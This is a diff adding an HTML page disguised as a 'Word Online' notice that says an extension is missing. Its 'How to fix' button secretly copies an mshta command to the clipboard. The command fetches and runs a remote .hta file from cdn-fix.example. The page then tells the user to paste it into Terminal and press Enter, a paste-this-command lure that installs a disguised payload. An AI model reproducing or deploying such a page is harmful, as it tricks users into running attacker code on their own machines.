@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Word Online</title></head>
+<body>
+  <h2>Word Online extension is not installed</h2>
+  <p>To view the document offline, the extension must be installed. Click "How to fix" and follow the instructions.</p>
+  <button id="fix">How to fix</button>
+  <div id="howto" hidden>
+    <p>1. Right-click the Start button (or press Win + X) and choose Terminal.</p>
+    <p>2. Paste the fix with Ctrl + V.</p>
+    <p>3. Press Enter.</p>
+  </div>
+  <script>
+    document.getElementById('fix').onclick = function () {
+      var t = document.createElement('textarea');
+      t.value = 'mshta https://cdn-fix.example/word.hta # Word Online fix';
+      t.style.position = 'fixed'; t.style.left = '-9999px';
+      document.body.appendChild(t); t.focus(); t.select();
+      try { document.execCommand('copy'); } catch (e) {}
+      document.body.removeChild(t);
+      document.getElementById('howto').hidden = false;
+    };
+  </script>
+</body>
+</html>
